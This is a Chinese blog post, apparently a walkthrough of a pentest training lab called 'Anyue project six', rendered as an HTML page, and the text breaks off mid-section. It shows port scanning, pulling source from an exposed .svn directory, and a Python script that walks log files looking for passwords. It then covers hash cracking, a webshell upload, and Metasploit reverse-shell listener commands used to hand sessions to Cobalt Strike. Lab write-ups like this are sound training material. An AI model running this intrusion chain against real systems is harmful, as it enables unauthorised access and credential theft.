@@ -1,0 +1,625 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>暗月渗透实战靶场-项目六 | like4h</title><meta name="keywords" content="红队,暗月渗透实战靶场"><meta name="author" content="like4h"><meta name="copyright" content="like4h"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="暗月渗透实战靶场-项目六  环境搭建 使用的是暗月提供的环境 直接虚拟机运行即可 设置网络环境  网卡配置的时候为了方便直接使用的是暗月的vm19的网卡配置的内网环境  00x1-信息搜集 我们已经知道目标主机 192.168.1.150  使用masscan 1sudo masscan -p 1-65535 192.168.1.150 --rate&#x3D;1000 结果  开启的有445、3389、">
+<meta property="og:type" content="article">
+<meta property="og:title" content="暗月渗透实战靶场-项目六">
+<meta property="og:url" content="http://example.com/2022/02/23/3679647319.html">
+<meta property="og:site_name" content="like4h">
+<meta property="og:description" content="暗月渗透实战靶场-项目六  环境搭建 使用的是暗月提供的环境 直接虚拟机运行即可 设置网络环境  网卡配置的时候为了方便直接使用的是暗月的vm19的网卡配置的内网环境  00x1-信息搜集 我们已经知道目标主机 192.168.1.150  使用masscan 1sudo masscan -p 1-65535 192.168.1.150 --rate&#x3D;1000 结果  开启的有445、3389、">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/04/08/yArF9MhpxCblkRJ.png">
+<meta property="article:published_time" content="2022-02-23T13:56:49.000Z">
+<meta property="article:modified_time" content="2022-05-18T10:41:31.823Z">
+<meta property="article:author" content="like4h">
+<meta property="article:tag" content="红队">
+<meta property="article:tag" content="暗月渗透实战靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/04/08/yArF9MhpxCblkRJ.png"><link rel="shortcut icon" href="/img/index/avater.jpg"><link rel="canonical" href="http://example.com/2022/02/23/3679647319"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="6e49742deeebc779b29d507edd20bad8"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?8903f8597aac32d70805a4aae2c824e1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '暗月渗透实战靶场-项目六',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-05-18 18:41:31'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/index/avater.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About Me</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2022/04/08/yArF9MhpxCblkRJ.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">like4h</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About Me</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">暗月渗透实战靶场-项目六</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-02-23T13:56:49.000Z" title="发表于 2022-02-23 21:56:49">2022-02-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-05-18T10:41:31.823Z" title="更新于 2022-05-18 18:41:31">2022-05-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BA%A2%E9%98%9F/">红队</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="暗月渗透实战靶场-项目六"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="暗月渗透实战靶场-项目六"><a class="markdownIt-Anchor" href="#暗月渗透实战靶场-项目六"></a> 暗月渗透实战靶场-项目六</h1>
+<h2 id="环境搭建"><a class="markdownIt-Anchor" href="#环境搭建"></a> 环境搭建</h2>
+<p>使用的是暗月提供的环境</p>
+<p>直接虚拟机运行即可</p>
+<p>设置网络环境</p>
+<p><img src="https://s2.loli.net/2022/04/30/4X5QdLFlHGwv8YZ.png" alt="image-20220117220701685" /></p>
+<p>网卡配置的时候为了方便直接使用的是暗月的vm19的网卡配置的内网环境</p>
+<h2 id="00x1-信息搜集"><a class="markdownIt-Anchor" href="#00x1-信息搜集"></a> 00x1-信息搜集</h2>
+<p>我们已经知道目标主机</p>
+<p>192.168.1.150</p>
+<h3 id="使用masscan"><a class="markdownIt-Anchor" href="#使用masscan"></a> 使用masscan</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo masscan -p 1-65535 192.168.1.150 --rate=1000</span><br></pre></td></tr></table></figure>
+<p>结果</p>
+<p><img src="https://s2.loli.net/2022/04/30/FLjyW8v9beocOtS.png" alt="image-20220117221059143" /></p>
+<p>开启的有445、3389、80的特殊端口</p>
+<p>断定是win服务器</p>
+<p>访问</p>
+<p><img src="https://s2.loli.net/2022/04/30/AOaFq6hvn2zPtRd.png" alt="image-20220117221249423" /></p>
+<p>直接访问是被拒绝的、典型的phpstady。</p>
+<h3 id="nmap扫描"><a class="markdownIt-Anchor" href="#nmap扫描"></a> nmap扫描</h3>
+<p>这里暂时不管、我们继续扫描、查看开放的端口之后使用nmap就进行扫描</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p 3306,445,3389,80,47001,49152,49156,49153,135,49157 -sS -sC -A 192.168.1.150 -oA web150-p</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/04/30/3FkKJpMLYR5tSbA.png" alt="Snipaste_2022-01-18_23-12-49" /></p>
+<p>这里我们还发现了目标机使用的dns解析的地址信息</p>
+<p>由于前面我们在访问的时候就知道是访问不了的肯定是需要进行域名的绑定的</p>
+<p><img src="https://s2.loli.net/2022/04/30/WEP3lgRNhSYtG2L.png" alt="image-20220118230848097" /></p>
+<p>绑定完成后在访问</p>
+<p><img src="https://s2.loli.net/2022/04/30/mnXDvfdpiwHyIRt.png" alt="Snipaste_2022-01-18_23-14-42" /></p>
+<p>一个信用贷的平台</p>
+<h3 id="使用whataweb查询网站的cms"><a class="markdownIt-Anchor" href="#使用whataweb查询网站的cms"></a> 使用whataweb查询网站的cms</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb www.webhack123.com</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/04/30/qpSt3ImoEwx6BGF.png" alt="image-20220118231758790" /></p>
+<p>使用的是thinkphp的框架</p>
+<h3 id="查询网站目录信息"><a class="markdownIt-Anchor" href="#查询网站目录信息"></a> 查询网站目录信息</h3>
+<h4 id="使用dirsearch"><a class="markdownIt-Anchor" href="#使用dirsearch"></a> 使用dirsearch</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py  -u &quot;www.webhack123.com&quot; -e *</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/RXxzsoL6BCANFMZ.png" alt="image-20220119002322057" /></p>
+<h4 id="使用gobuster"><a class="markdownIt-Anchor" href="#使用gobuster"></a> 使用gobuster</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://www.webhack123.com -w /usr/share/wordlists/dirb/big.txt -t 50 </span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/04/30/GNQZKRiw93FBltP.png" alt="image-20220119001338189" /></p>
+<h4 id="使用dirmap"><a class="markdownIt-Anchor" href="#使用dirmap"></a> 使用dirmap</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 dirmap.py -i http://www.webhack123.com -lcf</span><br><span class="line">项目</span><br><span class="line">https://github.com/H4ckForJob/dirmap</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/VvXUCQiWmRJLNZj.png" alt="image-20220119001908411" /></p>
+<h2 id="00x2-svn泄露并利用"><a class="markdownIt-Anchor" href="#00x2-svn泄露并利用"></a> 00x2-.svn泄露并利用</h2>
+<h3 id="网站下载"><a class="markdownIt-Anchor" href="#网站下载"></a> 网站下载</h3>
+<p>在三个工具中我们发现是由.svn文件的、这里我们使用工具进行下载</p>
+<p>我们先去进行访问一下</p>
+<p><img src="https://s2.loli.net/2022/04/30/7bCOQBdxET6ZrpW.png" alt="image-20220119145208358" /></p>
+<p>发现是有内容的</p>
+<p>使用工具进行下载</p>
+<p>这里我们使用的工具是</p>
+<p>进行下载</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rip-svn.pl -v -u http://www.webhack123.com/.svn</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/04/30/CnFXmHEhcxqzDAw.png" alt="image-20220119145959277" /></p>
+<p>然后我们可以看到下载的结果</p>
+<p><img src="https://s2.loli.net/2022/04/30/jWcPy2NzLqdsYDZ.png" alt="image-20220119150057168" /></p>
+<p>将源码下载下来</p>
+<p><img src="https://s2.loli.net/2022/04/30/KWTkYHojipSVzbw.png" alt="image-20220119151936240" /></p>
+<h2 id="00x3-网站审计"><a class="markdownIt-Anchor" href="#00x3-网站审计"></a> 00x3-网站审计</h2>
+<p>虽然我们将文件下载了下来但是发现是没有下载本应该存在的wc.db的数据库文件的、有的文件是需要我们自己进行下载的</p>
+<p><img src="https://s2.loli.net/2022/05/18/1bLYXIg3i7hlTW4.png" alt="image-20220119152959518" /></p>
+<p>完成下载</p>
+<h3 id="wcdb数据库查看"><a class="markdownIt-Anchor" href="#wcdb数据库查看"></a> wc.db数据库查看</h3>
+<p>对于db数据库我们可以使用sqlite软件进行打开</p>
+<p><img src="https://s2.loli.net/2022/04/30/y2EKdDvtgN8liG1.png" alt="image-20220119153227431" /></p>
+<p>对于这个数据表的作用我们只是为了查看网站的历史使用记录的情况、为了方便我们摸清楚网站的目录结构、这里我们是已经下载了网站的整个目录文件的</p>
+<h3 id="源码审计"><a class="markdownIt-Anchor" href="#源码审计"></a> 源码审计</h3>
+<p>这样我们对于整个网站的基本目录结构已经是知道了、查看有无后台管理登录页面</p>
+<p><img src="https://s2.loli.net/2022/04/30/D3Wf8oTyhI5BbLO.png" alt="image-20220119154031822" /></p>
+<p>网站的教程里面有一些配置信息的所在地</p>
+<p>发现后台管理的地址</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://admin.webhack123.com/</span><br></pre></td></tr></table></figure>
+<p>这里还是需要进行域名绑定的</p>
+<p><img src="https://s2.loli.net/2022/04/30/pSaGPQ6U39rtFZB.png" alt="image-20220119215340284" /></p>
+<p>然后我们再次访问</p>
+<p><img src="https://s2.loli.net/2022/04/30/xuDZSlrjXIEbQzi.png" alt="image-20220119215406318" /></p>
+<p>这里就需要我们获取数据库管理员账号密码</p>
+<p>接着往下看我们还掌握数据库的信息</p>
+<p><img src="https://s2.loli.net/2022/04/30/x2Pmz3JicCWq1FT.png" alt="image-20220119154829612" /></p>
+<h3 id="网站的日志文件"><a class="markdownIt-Anchor" href="#网站的日志文件"></a> 网站的日志文件</h3>
+<p><img src="https://s2.loli.net/2022/04/30/RX6zWEjSVmTduAP.png" alt="image-20220119154927646" /></p>
+<p>对于这种有暴露完整的日志文件的、我们可以在日志文件中查看一下有无管理员修改密码的操作的记录、</p>
+<p>我们可以在工具中的搜索功能自己进行搜索</p>
+<p><img src="https://s2.loli.net/2022/04/30/qjvxNFpAoGMnyJz.png" alt="image-20220119161639662" /></p>
+<h3 id="log日志遍历-寻找password"><a class="markdownIt-Anchor" href="#log日志遍历-寻找password"></a> log日志遍历-寻找password</h3>
+<p>也可以写个脚本自己遍历文件的内容</p>
+<p>但是这种方法只能是查找源码上面备份的、我们是不确定这个备份是不是最新的、所以我们要根据这个格式查找最新年份的log日志文件</p>
+<p>脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">testurl= <span class="string">&quot;http://www.webhack123.com/App/Runtime/Logs/18_07_04.log&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.webhack123.com/App/Runtime/Logs/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#关于日期</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logtime</span>(<span class="params">url,yeas</span>):</span><br><span class="line">  nurls = []</span><br><span class="line">  <span class="keyword">for</span> month <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">13</span>):</span><br><span class="line">    <span class="keyword">for</span> day <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">      <span class="keyword">if</span> month &lt; <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">if</span> day &lt; <span class="number">10</span>:</span><br><span class="line">          nurls.append(url+<span class="string">&quot;%s_0%s_0%s.log&quot;</span> %(yeas,month,day))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          nurls.append(url+<span class="string">&quot;%s_0%s_%s.log&quot;</span> %(yeas,month,day))</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> day &lt; <span class="number">10</span>:</span><br><span class="line">          nurls.append(url+<span class="string">&quot;%s_%s_0%s.log&quot;</span> %(yeas,month,day))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          nurls.append(url+<span class="string">&quot;%s_%s_%s.log&quot;</span> %(yeas,month,day))</span><br><span class="line">  <span class="keyword">return</span> nurls</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(logtime(url,19))</span></span><br><span class="line"></span><br><span class="line">yeas = [<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> yeas:</span><br><span class="line">  nurls = logtime(url,i)</span><br><span class="line">  <span class="comment">#print(nurls)</span></span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> nurls:</span><br><span class="line">    result = requests.get(j)</span><br><span class="line">    <span class="keyword">if</span> result.status_code == <span class="number">200</span>:</span><br><span class="line">      <span class="built_in">print</span>(j)</span><br><span class="line">      <span class="keyword">if</span> <span class="string">&quot;password&quot;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;webpasswd.txt&quot;</span>,<span class="string">&quot;a&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">          f.write(result.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在次查找</p>
+<p><img src="https://s2.loli.net/2022/04/30/Orlo8gDJEHAn2Sp.png" alt="image-20220119215956926" /></p>
+<p>得到最新的密码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">74c774ef39b5b977c1fd59dbfc73c3e380a65aa3</span><br></pre></td></tr></table></figure>
+<h3 id="解密-登录"><a class="markdownIt-Anchor" href="#解密-登录"></a> 解密-登录</h3>
+<p>然后进行MD5解密</p>
+<p><img src="https://s2.loli.net/2022/04/30/CcjgstEflNBvXpJ.png" alt="image-20220119220220668" /></p>
+<p>但是要密码、哦豁花钱的东西咱不搞、换</p>
+<p><a target="_blank" rel="noopener" href="http://somd5.com">somd5.com</a></p>
+<p><img src="https://s2.loli.net/2022/04/30/3MDgw98jveuEC5A.png" alt="image-20220119220414678" /></p>
+<p>nice</p>
+<p>去登陆</p>
+<p><img src="https://s2.loli.net/2022/04/30/HEN7nWtpZf8v2bo.png" alt="image-20220119220515342" /></p>
+<p>登录成功</p>
+<h2 id="00x4-拿shell-查看目标机信息"><a class="markdownIt-Anchor" href="#00x4-拿shell-查看目标机信息"></a> 00x4-拿shell-查看目标机信息</h2>
+<p>先在平台逛逛、基本上管理员的用户后台都会有上传的地方的、</p>
+<p><img src="https://s2.loli.net/2022/04/30/wWHBZSKdUztGavQ.png" alt="image-20220119220550845" /></p>
+<p>写个小马、getshell</p>
+<p><img src="https://s2.loli.net/2022/04/30/FmNxKRfoyWOsiU4.png" alt="image-20220119220828832" /></p>
+<p>查看基本信息</p>
+<p><img src="https://s2.loli.net/2022/04/30/P9kZtjzX1FawmGc.png" alt="image-20220119221001326" /></p>
+<p>system权限</p>
+<h3 id="查看配置文件"><a class="markdownIt-Anchor" href="#查看配置文件"></a> 查看配置文件</h3>
+<p>数据库</p>
+<p><img src="https://s2.loli.net/2022/04/30/iRvtljco9ZKxQA1.png" alt="image-20220119221045050" /></p>
+<p>配置文件</p>
+<p><img src="https://s2.loli.net/2022/04/30/3K7tNiBXHzyAIEP.png" alt="image-20220119221110615" /></p>
+<h3 id="尝试连接数据库"><a class="markdownIt-Anchor" href="#尝试连接数据库"></a> 尝试连接数据库</h3>
+<p><img src="https://s2.loli.net/2022/04/30/oBPErX1N8dVHJFA.png" alt="image-20220119221352324" /></p>
+<p>查看数据表</p>
+<p><img src="https://s2.loli.net/2022/04/30/EMBOHlsYpnxCb8r.png" alt="image-20220119221523230" /></p>
+<p>是可以查看的</p>
+<p>然后我们查看网卡信息</p>
+<p><img src="https://s2.loli.net/2022/04/30/WdNjx9QLaOBiCFH.png" alt="image-20220119222444794" /></p>
+<p>哦豁里面还有大动作</p>
+<h2 id="00x5-msfcs冰蝎进行webshell的互联"><a class="markdownIt-Anchor" href="#00x5-msfcs冰蝎进行webshell的互联"></a> 00x5-MSF+CS+冰蝎进行webshell的互联</h2>
+<h3 id="文件上传cobaltstrikemsf"><a class="markdownIt-Anchor" href="#文件上传cobaltstrikemsf"></a> 文件上传–&gt;cobaltstrike–&gt;msf</h3>
+<h4 id="cobaltstrike的getshell"><a class="markdownIt-Anchor" href="#cobaltstrike的getshell"></a> cobaltstrike的getshell</h4>
+<h5 id="制作攻击载荷"><a class="markdownIt-Anchor" href="#制作攻击载荷"></a> 制作攻击载荷</h5>
+<p><img src="https://s2.loli.net/2022/04/30/1HbmdqYuLE6Qpw2.png" alt="image-20220119224419163" /></p>
+<h5 id="生成文件并上传"><a class="markdownIt-Anchor" href="#生成文件并上传"></a> 生成文件并上传</h5>
+<p><img src="https://s2.loli.net/2022/04/30/CWSwtUFyzPMe6Kc.png" alt="image-20220119224511127" /></p>
+<h5 id="执行"><a class="markdownIt-Anchor" href="#执行"></a> 执行</h5>
+<p><img src="https://s2.loli.net/2022/04/30/sDxlSvb28JAF56g.png" alt="image-20220119224546117" /></p>
+<h5 id="cs上线"><a class="markdownIt-Anchor" href="#cs上线"></a> cs上线</h5>
+<p><img src="https://s2.loli.net/2022/04/30/LhRuqrN6X9Sfl3y.png" alt="image-20220119224650540" /></p>
+<h5 id="然后将sessio转发到msf上进行互联"><a class="markdownIt-Anchor" href="#然后将sessio转发到msf上进行互联"></a> 然后将sessio转发到msf上进行互联</h5>
+<h5 id="配置msf"><a class="markdownIt-Anchor" href="#配置msf"></a> 配置msf</h5>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconcle</span><br><span class="line">use /multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">show options</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 9999</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h5 id="在cs上新建监听器"><a class="markdownIt-Anchor" href="#在cs上新建监听器"></a> 在cs上新建监听器</h5>
+<p><img src="https://s2.loli.net/2022/05/18/KdvsFwuaTe6kZox.png" alt="image-20220119231356542" /></p>
+<p>然后将上线的session转发到这个新建的监听器上</p>
+<p><img src="https://s2.loli.net/2022/04/30/cUxDadAyCBtP3YI.png" alt="image-20220119231550977" /></p>
+<h5 id="然后等待msf上线即可"><a class="markdownIt-Anchor" href="#然后等待msf上线即可"></a> 然后等待msf上线即可</h5>
+<p><img src="https://s2.loli.net/2022/04/30/JhmgXF3oxOyqQ89.png" alt="image-20220119231746963" /></p>
+<p>msf成功上线</p>
+<h3 id="冰蝎msfcs"><a class="markdownIt-Anchor" href="#冰蝎msfcs"></a> 冰蝎–&gt;msf–&gt;cs</h3>
+<p>在冰蝎3.0以后就有反弹shell直接到msf的功能了</p>
+<p><img src="https://s2.loli.net/2022/04/30/QqP1pWDJuBUosaX.png" alt="image-20220119232713733" /></p>
+<p>直接选择连msf然后跟着下面的提示做就行</p>
+<p>打开MSF</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconcle</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">shwo options</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set port 9999</span><br><span class="line">run</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/ks3m5HKwBZExe2S.png" alt="image-20220120152410906" /></p>
+<p>执行完成过后在冰蝎的页面点击matesploit连接</p>
+<p><img src="https://s2.loli.net/2022/04/30/EKG2sJeSCIco3hr.png" alt="image-20220120152337520" /></p>
+<p>然后在msf上就会收到session会话</p>
+<p><img src="https://s2.loli.net/2022/04/30/F98RQp6ZoE52Gn3.png" alt="image-20220120152449478" /></p>
+<p>然后进行设置session转发到cs上</p>
